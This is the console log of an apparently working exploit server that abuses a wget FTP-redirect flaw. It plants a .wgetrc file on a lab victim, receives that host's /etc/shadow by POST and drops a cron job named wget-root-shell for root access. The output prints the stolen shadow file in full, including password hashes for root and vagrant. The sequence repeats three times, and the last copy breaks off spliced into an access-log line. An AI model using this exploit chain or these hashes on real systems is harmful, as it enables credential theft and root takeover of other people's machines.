192.168.33.1 - - [21/Aug/2017 20:14:02] "GET /database.db HTTP/1.1" 301 -
192.168.33.1 - - [21/Aug/2017 20:15:01] "POST /database.db HTTP/1.1" 200 -
192.168.33.1 - - [21/Aug/2017 20:16:02] "POST /database.db HTTP/1.1" 200 -
Ready? Is your FTP server running?
FTP found open on 192.168.33.8:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /database.db by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root 

Sending redirect to ftp://anonymous@192.168.33.8:21/.wgetrc 

We have a volunteer requesting /database.db by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 root:$6$jl2sf48UOUgRC4a4$3l0rKG3LeRn4yVMSVD57qwbXCX5QiiT9tQHW48AEr.7IZiAyKSB3m60RZeBEn4EAKGJlUbeMVek2PaxYHDgRX.::0:99999:7:::
bin:*:17206:0:99999:7:::
daemon:*:17206:0:99999:7:::
adm:*:17206:0:99999:7:::
lp:*:17206:0:99999:7:::
sync:*:17206:0:99999:7:::
shutdown:*:17206:0:99999:7:::
halt:*:17206:0:99999:7:::
mail:*:17206:0:99999:7:::
operator:*:17206:0:99999:7:::
games:*:17206:0:99999:7:::
ftp:*:17206:0:99999:7:::
nobody:*:17206:0:99999:7:::
apache:!!:17370::::::
systemd-coredump:!!:17370::::::
systemd-timesync:!!:17370::::::
systemd-network:!!:17370::::::
systemd-resolve:!!:17370::::::
dbus:!!:17370::::::
polkitd:!!:17370::::::
qemu:!!:17370::::::
rtkit:!!:17370::::::
pulse:!!:17370::::::
usbmuxd:!!:17370::::::
openvpn:!!:17370::::::
radvd:!!:17370::::::
avahi:!!:17370::::::
geoclue:!!:17370::::::
rpc:!!:17370:0:99999:7:::
nm-openconnect:!!:17370::::::
colord:!!:17370::::::
setroubleshoot:!!:17370::::::
abrt:!!:17370::::::
nm-openvpn:!!:17370::::::
saslauth:!!:17370::::::
gdm:!!:17370::::::
rpcuser:!!:17370::::::
gnome-initial-setup:!!:17370::::::
sshd:!!:17370::::::
chrony:!!:17370::::::
tss:!!:17370::::::
tcpdump:!!:17370::::::
vagrant:$6$nUkyshZHzir13X2X$Lo1khFvOW5WaQHoY4qa6UQtZQIttYSDKsvq6agsoySGfmwegxH9ud40E6ykozAuW8dNqGveWhBANYBF/I4MoC1::0:99999:7:::
vboxadd:!!:17370::::::
 
---[eof]---


Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 

We have a volunteer requesting /database.db by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 root:$6$jl2sf48UOUgRC4a4$3l0rKG3LeRn4yVMSVD57qwbXCX5QiiT9tQHW48AEr.7IZiAyKSB3m60RZeBEn4EAKGJlUbeMVek2PaxYHDgRX.::0:99999:7:::
bin:*:17206:0:99999:7:::
daemon:*:17206:0:99999:7:::
adm:*:17206:0:99999:7:::
lp:*:17206:0:99999:7:::
sync:*:17206:0:99999:7:::
shutdown:*:17206:0:99999:7:::
halt:*:17206:0:99999:7:::
mail:*:17206:0:99999:7:::
operator:*:17206:0:99999:7:::
games:*:17206:0:99999:7:::
ftp:*:17206:0:99999:7:::
nobody:*:17206:0:99999:7:::
apache:!!:17370::::::
systemd-coredump:!!:17370::::::
systemd-timesync:!!:17370::::::
systemd-network:!!:17370::::::
systemd-resolve:!!:17370::::::
dbus:!!:17370::::::
polkitd:!!:17370::::::
qemu:!!:17370::::::
rtkit:!!:17370::::::
pulse:!!:17370::::::
usbmuxd:!!:17370::::::
openvpn:!!:17370::::::
radvd:!!:17370::::::
avahi:!!:17370::::::
geoclue:!!:17370::::::
rpc:!!:17370:0:99999:7:::
nm-openconnect:!!:17370::::::
colord:!!:17370::::::
setroubleshoot:!!:17370::::::
abrt:!!:17370::::::
nm-openvpn:!!:17370::::::
saslauth:!!:17370::::::
gdm:!!:17370::::::
rpcuser:!!:17370::::::
gnome-initial-setup:!!:17370::::::
sshd:!!:17370::::::
chrony:!!:17370::::::
tss:!!:17370::::::
tcpdump:!!:17370::::::
vagrant:$6$nUkyshZHzir13X2X$Lo1khFvOW5WaQHoY4qa6UQtZQIttYSDKsvq6agsoySGfmwegxH9ud40E6ykozAuW8dNqGveWhBANYBF/I4MoC1::0:99999:7:::
vboxadd:!!:17370::::::
 
---[eof]---


Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 

We have a volunteer requesting /database.db by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 root:$6$jl2sf48UOUgRC4a4$3l0rKG3LeRn4yVMSVD57qwbXCX5QiiT9tQHW48AEr.7IZiAyKSB3m60RZeBEn4EAKGJlUbeMVek2PaxYHDgRX.::0:99999:7:::
bin:*:17206:0:99999:7:::
daemon:*:1192.168.33.1 - - [21/Aug/2017 20:17:01] "POST /database.db HTTP/1.1" 200 -
